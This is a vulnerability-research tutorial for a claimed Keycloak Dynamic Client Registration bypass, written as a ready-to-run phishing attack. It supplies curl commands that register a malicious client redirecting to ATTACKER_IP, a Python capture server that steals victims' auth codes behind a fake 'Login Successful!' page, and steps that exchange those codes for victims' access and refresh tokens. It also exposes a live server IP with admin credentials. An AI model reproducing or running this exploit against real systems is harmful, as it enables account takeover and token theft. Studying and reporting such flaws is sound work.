# Tutorial: Finding #5 — DCR Trusted Hosts Bypass — Live Token Theft via Phishing

**Severity:** HIGH (CVSS 8.0)
**Demo time:** ~10 minutes
**Requirements:** 2 Machines (or 2 Terminals on same machine for testing) + 1 Browser
**This is the most impactful finding — full token theft from the victim in real-time!**

---

## Architecture

This PoC is designed to run from a **remote attacker machine** — NOT from the Keycloak server itself. This makes the attack realistic: the attacker only needs network access to the Keycloak public endpoint.

| Machine | Role | Scripts |
|---|---|---|
| **Machine A** (KC Server) | Keycloak host + one-time admin setup | `setup_f5_admin.py` |
| **Machine B** (Attacker) | Runs the attack, captures victim tokens | `poc_f5_dcr_hijack.py` |

If you only have one machine, you can run both scripts on it — just use the public IP for `--host` and `--attacker-host`.

---

## Attack Scenario

1. **Admin** (one-time) runs setup script to assign `create-client` role to testuser
2. **Attacker** (from their own machine) runs the attack script
3. Script automatically registers a malicious client, generates a phishing URL, starts a capture server
4. **Attacker** sends the phishing URL to the **victim** (via email, chat, etc.)
5. **Victim** clicks the link → sees a 100% legitimate Keycloak login page → logs in
6. Auth code is automatically sent to the attacker's server → exchanged for **victim's token**

---

## Step 0: Ensure Keycloak is Running

On Machine A (KC Server):

```bash
curl -s http://localhost:8080/realms/test | python3 -c "import sys,json; print('Keycloak OK:', json.load(sys.stdin)['realm'])"
```

---

## Step 1: (MACHINE A — ONE TIME) Run Admin Setup

This prepares the environment: creates users and assigns the `create-client` role. This is NOT part of the attack — it simulates the real-world prerequisite that a user has the `create-client` role.

```bash
cd /home/anggi/keycloak-research
python3 pocs/setup_f5_admin.py --host http://localhost:8080 --realm test
```

**Expected output:**
```
[Setup] Finding #5 — Admin Environment Preparation
  [*] Keycloak: localhost:8080
  [*] Realm: test
  [*] Getting admin token...
  [+] Admin token OK
  [*] Ensuring testuser exists...
  [*] User 'testuser' already exists (ID: ...)
  [*] Ensuring victim user exists...
  [*] User 'victim' already exists (ID: ...)
  [*] Assigning create-client role to testuser...
  [+] create-client role assigned to testuser

[+] Setup complete!
    Attacker user : testuser / Password123 (has create-client role)
    Victim user   : victim / Password123
    Realm         : test
```

### Or via Admin Console:
1. Open: `http://46.101.162.187:8080/admin/master/console/`
2. Login: `admin` / `Admin1234`
3. Realm **test** → **Users** → click **testuser**
4. Tab **Role mappings** → click **Assign role**
5. Filter by client → select **realm-management**
6. Check **create-client** → click **Assign**

---

## Step 2: (MACHINE B — ATTACKER) Run the Attack

### Method A: With Local Listener (attacker has public IP)

The attacker runs this from their own machine. They need:
- Keycloak's public URL (`--host`)
- Their own public IP (`--attacker-host`)

```bash
python3 pocs/poc_f5_dcr_hijack.py \
  --host http://46.101.162.187:8080 \
  --attacker-host <ATTACKER_PUBLIC_IP> \
  --listen-port 48888
```

### Method B: With webhook.site (attacker has NO public IP)

If the attacker doesn't have a public IP (behind NAT, etc.), use webhook.site as the callback:

```bash
python3 pocs/poc_f5_dcr_hijack.py \
  --host http://46.101.162.187:8080 \
  --use-webhook
```

The script will:
1. Login as the attacker (testuser) — public endpoint, no admin needed
2. Create a webhook.site callback URL
3. Register a malicious client via DCR (redirect → webhook.site)
4. Generate a phishing URL
5. Poll webhook.site for the victim's auth code
6. Exchange auth code for victim's token

### Auto-Victim Mode (for automated testing)

```bash
# Using local listener (run on KC server for testing)
python3 pocs/poc_f5_dcr_hijack.py \
  --host http://46.101.162.187:8080 \
  --attacker-host 46.101.162.187 \
  --auto-victim --timeout 30

# Using webhook.site
python3 pocs/poc_f5_dcr_hijack.py \
  --host http://46.101.162.187:8080 \
  --use-webhook \
  --auto-victim --timeout 60
```

---

## What the Script Does

**Expected output (with local listener):**
```
╔══════════════════════════════════════════════════════════════╗
║  Finding #5: DCR Trusted Hosts Bypass                        ║
║  Live Phishing Attack — Automated Token Theft                ║
║  Keycloak 26.5.4 — CVSS 8.0 (HIGH)                         ║
╚══════════════════════════════════════════════════════════════╝

[Step 1] ATTACKER — Login as testuser (has create-client role)
  [+] Login successful — token: eyJhbGciOiJSUzI1NiIsInR5cCI...

[Step 2] ATTACKER — Prepare callback endpoint
  [*] Callback URL: http://ATTACKER_IP:48888/callback

[Step 3] ATTACKER — Register malicious client via Dynamic Client Registration
  [+] Malicious client REGISTERED successfully!
      Client ID     : 425bebcb-...
      Client Secret : YDEWNkAW...
      Redirect URI  : http://ATTACKER_IP:48888/callback
  [!] Trusted Hosts policy NOT enforced for authenticated DCR!

[Step 4] CONTROL — Anonymous DCR (no authentication)
  [+] Anonymous DCR BLOCKED (correct): Policy 'Trusted Hosts' rejected...

[Step 5] ATTACKER — Start phishing server (auth code catcher)
  [+] Phishing server active on 0.0.0.0:48888

[Step 6] ATTACKER — Generate phishing URL

  ╔══════════════════════════════════════════════════════════════╗
  ║              PHISHING URL READY TO SEND                      ║
  ╚══════════════════════════════════════════════════════════════╝

  Send this URL to the target victim:

  http://46.101.162.187:8080/realms/test/protocol/openid-connect/auth?client_id=...

[Step 7] Waiting for victim to log in...
```

### Simulate the Victim (browser):

1. **Copy the phishing URL** from the script output
2. **Open that URL in the browser**
3. A **100% legitimate Keycloak login page** will appear — no suspicious signs!
4. Login as the victim:
   - Username: `victim`
   - Password: `Password123`
5. After login, the victim sees a **"Login Successful!"** page (fake page from attacker)

### Back in the attacker terminal:

```
=======================================================
  *** VICTIM AUTH CODE CAPTURED! ***
=======================================================
  Code: 7e7cad47-b4b2-e780-9295-6dd0c51e7e9e...
=======================================================

[Step 8] ATTACKER — Exchange stolen auth code for victim tokens

╔══════════════════════════════════════════════════════════════╗
║           VICTIM TOKEN SUCCESSFULLY STOLEN!                  ║
╚══════════════════════════════════════════════════════════════╝

  Username     : victim
  Email        : victim@test.com
  Full Name    : Victim User
  Scope        : openid profile email

[Step 9] ATTACKER — Verify access to victim data with stolen token
  [+] Victim userinfo accessed successfully

[!] VULNERABILITY CONFIRMED — 4/4 tests positive
```

---

## Method C: Manual Step-by-Step (For Detailed Understanding)

### Step 2: (ATTACKER) Login and Obtain Token

From the attacker machine (no admin access needed):

```bash
ATTACKER_TOKEN=$(curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=webapp" \
  -d "grant_type=password" \
  -d "username=testuser" \
  -d "password=Password123" \
  -d "scope=openid" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

echo "Attacker token: ${ATTACKER_TOKEN:0:40}..."
```

### Step 3: (ATTACKER) Register Malicious Client via DCR

```bash
REG_RESP=$(curl -s -X POST http://46.101.162.187:8080/realms/test/clients-registrations/openid-connect \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "client_name": "Aplikasi Resmi Perusahaan",
    "redirect_uris": ["http://ATTACKER_IP:48888/callback"],
    "grant_types": ["authorization_code","refresh_token"],
    "response_types": ["code"]
  }')

echo "$REG_RESP" | python3 -c "
import sys,json
d = json.load(sys.stdin)
print('=== MALICIOUS CLIENT REGISTERED! ===')
print(f'Client ID:     {d[\"client_id\"]}')
print(f'Client Secret: {d[\"client_secret\"]}')
print(f'Redirect URI:  {d[\"redirect_uris\"]}')
print('================================')
"

MAL_CLIENT_ID=$(echo "$REG_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['client_id'])")
MAL_SECRET=$(echo "$REG_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['client_secret'])")
```

> **VULNERABLE:** Client with redirect to attacker's server was registered without rejection!

### Step 4: (CONTROL) Anonymous DCR — Should Be Rejected

```bash
curl -s -X POST http://46.101.162.187:8080/realms/test/clients-registrations/openid-connect \
  -H "Content-Type: application/json" \
  -d '{"client_name":"anon-test","redirect_uris":["http://ATTACKER_IP:48888/callback"]}' \
  | python3 -m json.tool
```

**Output (Correctly Rejected):**
```json
{
  "error": "insufficient_scope",
  "error_description": "Policy 'Trusted Hosts' rejected request... Host not trusted."
}
```

### Step 5: (ATTACKER) Start Capture Server (Terminal 2)

Open a new terminal on the attacker machine:

```bash
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        params = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
        if 'code' in params:
            code = params['code'][0]
            print()
            print('=' * 55)
            print('  *** VICTIM AUTH CODE CAPTURED! ***')
            print('=' * 55)
            print(f'  Code: {code}')
            print('=' * 55)
            print()
            print('Use this code in Step 8 to steal the victim token!')
            print()
        self.send_response(200)
        self.send_header('Content-Type','text/html')
        self.end_headers()
        self.wfile.write(b'<html><body><h2>Login Successful!</h2><p>This page can be closed.</p></body></html>')
    def log_message(self, *a): pass

print('Capture server active on port 48888...')
print('Waiting for victim to click phishing URL and login...')
HTTPServer(('0.0.0.0', 48888), H).serve_forever()
"
```

### Step 6: (ATTACKER) Generate Phishing URL (Terminal 1)

```bash
echo ""
echo "=== PHISHING URL ==="
echo "Send this URL to the victim:"
echo ""
echo "http://46.101.162.187:8080/realms/test/protocol/openid-connect/auth?client_id=${MAL_CLIENT_ID}&response_type=code&redirect_uri=http%3A%2F%2FATTACKER_IP%3A48888%2Fcallback&scope=openid+profile+email"
echo ""
echo "This URL looks 100% legitimate — real Keycloak domain!"
echo "===================="
```

### Step 7: (VICTIM) Click URL and Login

1. **Open the phishing URL in a browser**
2. The **real Keycloak** login page appears — no suspicious signs
3. Login as victim:
   - Username: `victim`
   - Password: `Password123`
4. Victim sees a "Login Successful!" page (fake, from the attacker)

### Step 8: (ATTACKER) Exchange Auth Code → Victim Token

```bash
AUTH_CODE="PASTE_CODE_FROM_TERMINAL_2"

curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=$MAL_CLIENT_ID" \
  -d "client_secret=$MAL_SECRET" \
  -d "grant_type=authorization_code" \
  -d "code=$AUTH_CODE" \
  -d "redirect_uri=http://ATTACKER_IP:48888/callback" \
  | python3 -c "
import sys,json,base64
d = json.load(sys.stdin)
if 'error' in d:
    print('Error:', d)
    sys.exit(1)

at = d['access_token']
payload = at.split('.')[1] + '=='
claims = json.loads(base64.b64decode(payload))

print()
print('====================================')
print('  VICTIM TOKEN SUCCESSFULLY STOLEN!')
print('====================================')
print(f'  Username:      {claims.get(\"preferred_username\")}')
print(f'  Email:         {claims.get(\"email\")}')
print(f'  Name:          {claims.get(\"name\")}')
print(f'  User ID:       {claims.get(\"sub\")}')
print(f'  Scope:         {d.get(\"scope\")}')
print(f'  Access Token:  {at[:50]}...')
print(f'  Refresh Token: {d.get(\"refresh_token\",\"\")[:50]}...')
print('====================================')
print()
print('Attacker now has full access to the victim account!')
"
```

### Step 9: (ATTACKER) Verify — Access Victim Data

```bash
VICTIM_TOKEN=$(curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=$MAL_CLIENT_ID" \
  -d "client_secret=$MAL_SECRET" \
  -d "grant_type=authorization_code" \
  -d "code=$AUTH_CODE" \
  -d "redirect_uri=http://ATTACKER_IP:48888/callback" \
  | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token',''))")

curl -s http://46.101.162.187:8080/realms/test/protocol/openid-connect/userinfo \
  -H "Authorization: Bearer $VICTIM_TOKEN" \
  | python3 -m json.tool
```

---

## Summary

| Step | Action | Result |
|---|---|---|
| Setup | Admin assigns create-client role (one-time) | Prerequisite complete |
| 1 | Attacker logs in as testuser (public endpoint) | Token obtained |
| 2 | Attacker registers client via authenticated DCR | Client with redirect to attacker's server — **SUCCESS** |
| 3 | Control: Anonymous DCR | **BLOCKED** by Trusted Hosts (correct) |
| 4 | Phishing server ready (or webhook.site) | Listener active |
| 5 | Attacker generates phishing URL | 100% legitimate Keycloak domain URL |
| 6 | Victim clicks URL, logs in on real Keycloak | Auth code redirected to attacker — **CAPTURED** |
| 7 | Attacker exchanges auth code | Victim's token — **FULLY STOLEN** |
| 8 | Access victim data | Userinfo successfully accessed — **VERIFIED** |

**Policy Gap:**
- **Anonymous DCR:** Trusted Hosts ENFORCED (correct)
- **Authenticated DCR:** Trusted Hosts **ABSENT** (vulnerability)
- **Admin REST API:** Returns 403 (correct)

**Attack Flow:**
```
[Machine A — KC Server]              [Machine B — Attacker]
        │                                     │
        │  (one-time setup)                   │
        │  setup_f5_admin.py                  │
        │                                     │
        │                              poc_f5_dcr_hijack.py
        │                                     │
        │                              1. Login as testuser
        │                              2. Register malicious client (DCR)
        │                              3. Start listener / webhook.site
        │                              4. Generate phishing URL
        │                                     │
        │                              5. Send URL to victim ──► Victim clicks
        │                                                            │
        │                                                     Real KC login page
        │                                                            │
        │  ◄── Keycloak redirects to attacker ──────────────────────┘
        │                                     │
        │                              6. Capture auth code
        │                              7. Exchange → victim token
        │                              8. FULL ACCESS
```

**Conclusion:** A single user with the `create-client` role can steal the token of any user in the same realm, including admins. The attack runs entirely from a remote machine — no access to the Keycloak server is needed. The victim sees a login page that is 100% genuine from the real Keycloak domain.
